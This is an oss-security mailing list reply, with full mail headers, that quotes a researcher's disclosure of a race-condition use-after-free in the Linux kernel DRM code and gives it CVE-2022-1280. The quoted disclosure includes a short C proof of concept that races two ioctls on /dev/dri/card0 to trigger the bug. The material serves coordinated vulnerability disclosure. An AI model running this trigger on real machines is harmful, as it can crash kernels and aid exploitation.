Received: (qmail 29862 invoked by uid 550); 13 Apr 2022 06:51:10 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
Received: (qmail 29843 invoked from network); 13 Apr 2022 06:51:09 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20210112;
        h=sender:date:from:to:subject:message-id:references:mime-version
         :content-disposition:in-reply-to;
        bh=qOYYa5wq7s2Y5YD9luIr3fpSrwYcKV3uYWLdY6JzL5M=;
        b=G3S0i4eVVxZFcqC3573fpPg6CjkqQ4++MmfZapcEKRJ/Y/OSuUuPPgbgN/QNdw96ui
         HXhvsODMI6yqMJkHPjag42MtGosnhtV9B1vvOwjV1ZQ8YSuuYEc/bMVVog3yPg7fp0fm
         4AmdBeYyghLec4oi/9wM1geEWmxSib9hO4eur7Hf9bINU769sNpsY+M979PNU8YOtAPN
         oQ9cRLkOfbuJg8qcXS55LNiHkZxW4r71qXOT+dDXNQcWh7lhiJCxLpilNU5Qk/4vIo0x
         StdnLrcKkXe7+6VwI0WrKrmxjP+dgX7xCaJguGIWWS4IrDm0hTxpdBGpwHDupO1Z+WOj
         e91g==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20210112;
        h=x-gm-message-state:sender:date:from:to:subject:message-id
         :references:mime-version:content-disposition:in-reply-to;
        bh=qOYYa5wq7s2Y5YD9luIr3fpSrwYcKV3uYWLdY6JzL5M=;
        b=5nkxfGroeMX3rJYq3KEedWliTXZJuWPCPZ8qF64bBQI170sMd6WRsskLUyIKM6nnpx
         kW+IwNrgx7f96xinishVc1tbw38hBh1risBHt9029h2RrlY7wjXkjAN4s3UgD5U4iEmI
         Dde043I5r+jXOA66Pl/OumxH3L3e/ElSd1p+F51JKgLYSyPiOzrbk4jAFevHd+WPG5PJ
         mq7saGlicypX3mjBZChyhGNehAqpmlA+y937yaAIxIqmok3MkDImX3UVAzgGtbpDrWKe
         djE43mM7K3bhGWMoX+l/wB4H7YsFgPouRru/b/hVfkm/myZhir7HQfmE0O3KtqX/fT/C
         r5Xw==
X-Gm-Message-State: AOAM530+DKimdk1di6MRo9gFvhJWQQYUZx9haM0gKBriu0tcakrAFr3f
	JoX99QeSL94NR/Gaqxet5r0VCr58HLUgLw==
X-Google-Smtp-Source: ABdhPJwLga9kGhtNy2uCtrNmsyqHN1umHcK4/q/T14ZywvAKBvOmcj8zTOraDt5uB8GlLXQjtqqZxA==
X-Received: by 2002:adf:dc90:0:b0:207:aa5c:8524 with SMTP id r16-20020adfdc90000000b00207aa5c8524mr8607969wrj.523.1649832658478;
        Tue, 12 Apr 2022 23:50:58 -0700 (PDT)
Sender: Salvatore Bonaccorso <salvatore.bonaccorso@gmail.com>
Date: Wed, 13 Apr 2022 08:50:57 +0200
From: Salvatore Bonaccorso <carnil@debian.org>
To: oss-security@lists.openwall.com
Message-ID: <YlZy0dacHoITqtOt@eldamar.lan>
References: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Disposition: inline
In-Reply-To: <CAH5WSp6-nveUGNR8cEdXbFQs0m3AsDmhoN9sDx+WXfn2JsdjHg@mail.gmail.com>
Subject: Re: [oss-security] Linux kernel: A concurrency use-after-free
 between drm_setmaster_ioctl and drm_mode_getresources

Hi,

On Tue, Apr 12, 2022 at 07:42:04PM +0800, Minh Yuan wrote:
> Hi guys,
> 
> We recently discovered a concurrency uaf in drm of the latest kernel
> version (Linux 4.19.237).
> 
> The root cause of this race is that drm_setmaster_ioctl can free an old
> *fpriv->master* in drm_new_set_master, while drm_mode_getresources holds a
> freed *fpriv->master *in drm_lease_held due to the absence of proper
> lock/refcounting.
> 
> My unstable PoC is shown below (tested on Linux 4.19.237):
> 
> #include <endian.h>
> #include <stdint.h>
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <sys/syscall.h>
> #include <sys/types.h>
> #include <unistd.h>
> #include <errno.h>
> #include <fcntl.h>
> #include <sys/stat.h>
> #include <sys/mman.h>
> #include <pthread.h>
> #include <sys/xattr.h>
> #include <sys/shm.h>
> #include <linux/userfaultfd.h>
> #include <sys/ioctl.h>
> #include <drm/drm.h>
> #include <drm/drm_mode.h>
> 
> #define errExit(msg) do { perror(msg); exit(EXIT_FAILURE); \
> } while (0)
> int fd;
> char a[0x100];
> void *thread1(void *arg)
> {
> 
> ioctl(fd, DRM_IOCTL_SET_MASTER, 0);
> 
> }
> void *thread2(void *arg)
> {
> ioctl(fd, DRM_IOCTL_MODE_GETRESOURCES, &a);
> }
> int main(void)
> {
> pthread_t thr1,thr2;
> 
> int fd1 = open("/dev/dri/card0",0);
> fd = open("/dev/dri/card0",0);
> int fd2 = dup3(fd,fd1,0);
> int s = pthread_create(&thr1,NULL,thread1,(void*)NULL);
> if(s != 0)
> errExit("pthread_create");
> s = pthread_create(&thr2,NULL,thread2,(void*)NULL);
> if(s != 0)
> errExit("pthread_create");
> pthread_join(thr1,NULL);
> pthread_join(thr2,NULL);
> close(fd);
> }
> 
> Timeline:
> * 03.30.22 - Vulnerability reported to security@kernel.org.
> * 04.01.22 - Vulnerability reported to linux-distros@vs.openwall.org
> <security@kernel.org>.
> * 04.12.22 - Vulnerability opened.

This should have CVE-2022-1280 assigned.

Regards,
Salvatore
